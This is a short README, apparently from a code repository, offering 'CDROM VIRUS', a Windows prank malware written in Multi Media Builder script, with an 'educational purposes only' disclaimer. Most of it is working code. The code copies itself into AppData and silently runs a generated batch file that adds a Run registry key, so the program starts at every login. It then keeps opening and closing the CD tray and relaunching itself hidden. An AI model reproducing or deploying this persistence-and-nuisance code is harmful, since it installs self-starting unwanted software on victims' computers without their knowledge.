# CDROM VIRUS
 Malware script example
 A windows 10 maleware that opens and closes cdrom
 written with MMB Multi Media Builder
 
 Download Zip File and open the project with MMB
 
 Disclaimer:

For Educational Purposes Only.
 
Do not use it in real life. 
 
We are not liable to any user for

Loss, injury, claim, liability or damages of any kind, as a result of using tutorials or other information on the website.

Special, direct, incidental, punitive, exemplary or consequential damages of any kind whatsoever in any way due, as a result of using or inability for using the website or its contents.

Any third party websites or contents therein directly or indirectly accessed through links in the Site, including but not limited to any errors in or omissions.

```
** run the script on app start
RunScript("pageload")
```

```
** checks registery to see if the maleware already exists or not
** and install the app
InstFlag=1
LoadVariable("Installed","InstFlag ")
If (InstFlag=1) Then
  RunScript("run")
Else
  RunScript("install")
  InstFlag=1
  SaveVariable("Installed"," InstFlag")
End
RunScript("install")
```

```
** copy maleware to the target
** and create a bat file to register app in registery in order to run on start up
string$=<Temp>
substring$='\Temp\\'
RetVal=POS(substring$,string$)+1
localSystemDirectory$=StrCopy(string$,0,RetVal)
currentRoot$='<SrcDir>\\'+CBK_AppFileName
dest$ = localSystemDirectory$+CBK_AppFileName
FileExist("dest$","check")
If (check=1) Then
Else
  SysCommand("CopyFile","currentRoot$,dest$")
End
batFile$=localSystemDirectory$+CBK_AppFileName+'.bat'
regString$= 'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "My App" /t REG_SZ /F /D '+'"'+dest$+'"'
ReturnVal=StrToFile(batFile$,regString$,FALSE,FALSE)
Run("batFile$","HIDE")
```
This Code will copy the maleware to C:\Users\User\AppData\Local and creates and run a bat file as below:
```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "My App" /t REG_SZ /F /D "C:\Users\user\AppData\Local\maleware.exe"
```

Then runs the main code and ejects or close DVD/CD drive:
```
opened=1
LoadVariable("cdst","opened")
If (opened=1) Then
  opened=0
  SaveVariable("cdst"," opened")
  MCICommand("set cdaudio door closed")
Else
  RunScript("install")
  opened=1
  SaveVariable("cdst"," opened")
  MCICommand("set cdaudio door open")
End
currentRoot$='<SrcDir>\\'+CBK_AppFileName
Run("currentRoot$","HIDE")
ExitTimer("1000")
```
